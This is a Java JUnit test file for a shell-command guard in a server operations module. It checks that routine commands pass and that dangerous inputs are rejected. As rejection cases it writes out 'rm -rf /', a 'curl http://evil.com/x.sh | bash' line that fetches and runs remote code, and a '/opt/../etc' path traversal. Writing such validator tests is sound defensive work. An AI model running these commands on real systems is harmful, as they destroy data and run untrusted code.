package com.moli.user.center.server.operation.guard;

import com.moli.common.exception.BaseException;
import org.junit.Test;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

public class OperationShellGuardTest {

    @Test
    public void allows_combined_commands() {
        String cmd = OperationShellGuard.validateCommand("nginx -t && sudo nginx -s reload");
        assertEquals("nginx -t && sudo nginx -s reload", cmd);
    }

    @Test
    public void allows_pipe_grep() {
        String cmd = OperationShellGuard.validateCommand("ps aux | grep java");
        assertTrue(cmd.contains("|"));
    }

    @Test(expected = BaseException.class)
    public void rejects_rm_rf_root() {
        OperationShellGuard.validateCommand("rm -rf /");
    }

    @Test(expected = BaseException.class)
    public void rejects_curl_pipe_bash() {
        OperationShellGuard.validateCommand("curl http://evil.com/x.sh | bash");
    }

    @Test(expected = BaseException.class)
    public void rejects_path_traversal_in_workdir() {
        OperationShellGuard.validateAbsolutePath("/opt/../etc", "workDir");
    }

    @Test
    public void buildRemoteCommand_with_workdir() {
        String built = OperationShellGuard.buildRemoteCommand("ls -la", "/opt/moli");
        assertEquals("cd '/opt/moli' && ls -la", built);
    }

    @Test
    public void abbreviateForAudit_truncates_long_command() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 200; i++) {
            sb.append('x');
        }
        String shortText = OperationShellGuard.abbreviateForAudit(sb.toString(), 50);
        assertTrue(shortText.length() <= 50);
    }
}
